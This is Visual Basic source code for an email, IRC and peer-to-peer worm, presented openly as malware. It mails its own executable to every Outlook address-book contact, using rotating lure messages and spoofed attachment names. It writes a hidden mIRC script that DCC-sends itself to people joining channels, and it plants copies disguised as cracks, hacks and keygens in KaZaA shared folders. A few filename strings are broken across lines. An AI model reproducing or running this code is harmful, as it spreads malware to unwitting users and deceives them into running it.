Attribute VB_Name = "Module1"
Sub Main() 'Now we start!
On Error Resume Next 'If an error occurs continue
Dim RndChr, RndChr1 As String 'Random character
Dim RndChar, RndChar1 As String 'Random character
Dim RndSub, RndSub1 As String 'The subject (random)
Dim RndBod, RndBod1 As String 'The body (random)
Dim RndExt, RndExt1 As String 'Randomize file-extension
Dim RndAtt, RndAtt1 As String 'The attachment (random)
Dim AttNme As String 'Full attachment name
Dim OL, OLNS, I, J, AddyBook 'Objects and stuff
Randomize 'Initialize Random Number Generator
RndChr = Int((Rnd * 5) + 1) 'Randomize a character
RndChar = Int((Rnd * 8) + 1) 'Randomize a character
RndSub = Int((Rnd * 10) + 1) 'Randomize our subject
RndBod = Int((Rnd * 5) + 1) 'Randomize our body
RndExt = Int((Rnd * 10) + 1) 'Random file-extension
RndAtt = Int((Rnd * 10) + 1) 'Randomize our attachment
'=========================================================
If RndChr = 1 Then RndChr1 = "angry at me??"
If RndChr = 2 Then RndChr1 = "sad?"
If RndChr = 3 Then RndChr1 = "useless??"
If RndChr = 4 Then RndChr1 = "hateful???"
If RndChr = 5 Then RndChr1 = "playful??"
'=========================================================
If RndChar = 1 Then RndChar1 = "Tool"
If RndChar = 2 Then RndChar1 = "Song"
If RndChar = 3 Then RndChar1 = "Program"
If RndChar = 4 Then RndChar1 = "Document"
If RndChar = 5 Then RndChar1 = "Application"
If RndChar = 6 Then RndChar1 = "TextFile"
If RndChar = 7 Then RndChar1 = "Joke"
If RndChar = 8 Then RndChar1 = "Website"
If RndChar = 9 Then RndChar1 = "Tip"
If RndChar = 10 Then RndChar1 = "Thing"
'=========================================================
If RndSub = 1 Then RndSub1 = "We need to talk...!"
If RndSub = 2 Then RndSub1 = "What's the problem?"
If RndSub = 3 Then RndSub1 = "How are you??"
If RndSub = 4 Then RndSub1 = "You need help?"
If RndSub = 5 Then RndSub1 = "What's happening???"
If RndSub = 6 Then RndSub1 = "RE: Why you not replying??"
If RndSub = 7 Then RndSub1 = "Need help!"
If RndSub = 8 Then RndSub1 = "Check this out!"
If RndSub = 9 Then RndSub1 = "Why are you so " & RndChr1
If RndSub = 10 Then RndSub1 = "Funny " & RndChar1 & " for you..."
'=========================================================
If RndBod = 1 Then RndBod1 = ".I tried to reach you at MSN Messenger " & vbCrLf & "but you weren't online! I got something " & vbCrLf & "'really'important to tell you! Check the " & vbCrLf & "attached file (You'll find what I wanted to tell you there!) " & vbCrLf & "Ok. Reply as soon as possible! " & vbCrLf & "Bye!"
If RndBod = 2 Then RndBod1 = ".Where have you been all the time??? " & vbCrLf & "I tried to call you but you weren't home! " & vbCrLf & "Anyway, see the attached file! It's important! " & vbCrLf & "Bye."
If RndBod = 3 Then RndBod1 = ".You said you needed help huh? Well " & vbCrLf & "I got the solution for your problem! Just " & vbCrLf & "open the attached file and see what's in it ;) " & vbCrLf & "Bye!"
If RndBod = 4 Then RndBod1 = ".I need your help! I'm in a very " & vbCrLf & "difficault position right now. I can't decide " & vbCrLf & "how good the file is from rate 0 To 5! I need " & vbCrLf & "your opinion on it, so check it out (It's attached to this message!) " & vbCrLf & "and tell me what you think from rate 0 To 5! " & vbCrLf & "Bye!"
If RndBod = 5 Then RndBod1 = ".Why are you so angry at me? " & vbCrLf & "What have I done to you?? I only want you to check " & vbCrLf & "this file out; It describes my opinion about " & vbCrLf & "you. Please check it, you won 't be dissapointed ;) Hope to hear from you soon :) " & vbCrLf & "Bye!"
'=========================================================
If RndExt = 1 Then RndExt1 = ".exe"
If RndExt = 2 Then RndExt1 = ".com"
If RndExt = 3 Then RndExt1 = ".jpg"
If RndExt = 4 Then RndExt1 = ".mpg"
If RndExt = 5 Then RndExt1 = ".txt"
If RndExt = 6 Then RndExt1 = ".doc"
If RndExt = 7 Then RndExt1 = ".mp3"
If RndExt = 8 Then RndExt1 = ".asp"
If RndExt = 9 Then RndExt1 = ".htm"
If RndExt = 10 Then RndExt1 = ".php"
'=========================================================
If RndAtt = 1 Then RndAtt1 = "Funny"
If RndAtt = 2 Then RndAtt1 = "Nice_File"
If RndAtt = 3 Then RndAtt1 = "Cool_File"
If RndAtt = 4 Then RndAtt1 = "Nice Tool"
If RndAtt = 5 Then RndAtt1 = "Funny Toy"
If RndAtt = 6 Then RndAtt1 = "Funny Clip"
If RndAtt = 7 Then RndAtt1 = "Nice Song"
If RndAtt = 8 Then RndAtt1 = "Interesting"
If RndAtt = 9 Then RndAtt1 = "ReadMe"
If RndAtt = 10 Then RndAtt1 = "Information"
'=========================================================
AttNme = RndAtt1 & RndExt1 'Declare the whole attachment
'=========================================================
Set OL = CreateObject("Outlook.Application") 'Create object
Set OLNS = OL.GetNameSpace("MAPI") 'Get MAPI
If OL = "Outlook" Then 'Have we created the object?
OLNS.Logon "profile", "password", False 'Logon without showing a dialog
For I = 1 To OLNS.AddressLists.Count 'Count all users (contacts)
For J = 1 To OLNS.AddressLists(I).AddressEntries.Count
Set AddyBook = OLNS.AddressLists(I).AddressEntries(J) 'Create a variable with all users in the address book in it
With OL.CreateItem(0) '0 = olMailItem (VBA)
.Recipients.Add AddyBook 'Add the address book ;P
.Subject = RndSub1 'Add our randomly choosen subject
.Body = RndBod1 'Add our randomly choosen body
.Attachments.Add App.Path & "\" & App.EXEName & ".exe", 1, 1, AttNme 'Spoof the attachment
.Send 'Send
End With
AddyBook = ""
Next J
Next I
OLNS.Logoff 'Logoff
End If
Set OL = Nothing 'Release memory
Call mIRC
End Sub

Sub mIRC() 'Now we'll try to distrobute with mIRC
On Error Resume Next 'This line is important
FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\Cool_File.exe" 'Copy us to the root
SetAttr "C:\Cool_File.exe", vbHidden + vbReadOnly 'Set attributes to hidden and read-only
Dim FSO 'Create the Scripting.FileSystemObject object
Dim mIRCDir(1 To 4) As String
Dim mIRCPath As String
mIRCDir(1) = "C:\mIRC\" 'Declare possible folder
mIRCDir(2) = "C:\mIRC32\" 'Declare possible folder
mIRCDir(3) = "C:\Program Files\mIRC\" 'Declare possible folder
mIRCDir(4) = "C:\Program Files\mIRC32\" 'Declare possible folder
Set FSO = CreateObject("Scripting.FileSystemObject") 'Create the object
If FSO.FolderExists(mIRCDir(1)) = True Then mIRCPath = "C:\mIRC\" 'Possible folder
If FSO.FolderExists(mIRCDir(2)) = True Then mIRCPath = "C:\mIRC32\" 'Possible folder
If FSO.FolderExists(mIRCDir(3)) = True Then mIRCPath = "C:\Program Files\mIRC\" 'Possible folder
If FSO.FolderExists(mIRCDir(4)) = True Then mIRCPath = "C:\Program Files\mIRC32" 'Possible folder
'==========================================================
If mIRCPath <> "" Then GoTo mIRCTrue Else GoTo mIRCFalse
mIRCTrue:
Open mIRCPath & "Script.ini" For Output As #1 'Create the Script.ini in the mIRC folder
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1= /if ( $nick == $me ) { halt }"
Print #1, "n2= /msg $nick Wonna see something cool? Then accept the file-transfer and open the file :P"
Print #1, "n3= /dcc send $nick C:\Cool_File.exe"
Print #1, "n4= /if ( $me != $nick )"
Print #1, "n5= /dcc send $nick C:\Cool_File.exe"
Print #1, "n6=}"
Close #1 'Close the file
SetAttr mIRCPath & "Script.ini", vbHidden + vbReadOnly 'Set the script file to hidden and read-only
mIRCFalse:
Set FSO = Nothing 'Release memory
Call KaZaA
End Sub

Sub KaZaA() 'Lame but whatever :/
On Error Resume Next
Dim KaZaADir(1 To 2) As String
KaZaADir(1) = "C:\KaZaA\My Shared Folder\" 'This is only a "guess" folder
KaZaADir(2) = "C:\Program Files\KaZaA\My Shared Folder\" 'This is the default folder of KaZaA
Dim KaZaAPath As String
Dim FSO1 'Create the Scripting.FileSystemObject again
Set FSO1 = CreateObject("Scripting.FileSystemObject")
If FSO1.FolderExists(KaZaADir(1)) = True Then KaZaAPath = "C:\KaZaA\My Shared Folder\" 'Does it exists?
If FSO1.FolderExists(KaZaADir(2)) = True Then KaZaAPath = "C:\Program Files\KaZaA\My Shared Folder\" 'Does it exists?
If KaZaAPath <> "" Then GoTo KaZaATrue Else GoTo KaZaAFalse 'Small Runtime error fix
KaZaATrue: 'Copy us with some names
FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "MSN Crack.exe"
FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "MSN Hack.exe"
FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "ICQ Password "
Hack.exe ""
FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "HotMail "
Hack.exe ""
FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "SpiderMan-PC-Game-v2 FullDownloader.exe"
FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "ICQ Hack.exe"
FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "Windows (All Versions) KeyGen.exe"
KaZaAFalse: 'Quit
End Sub
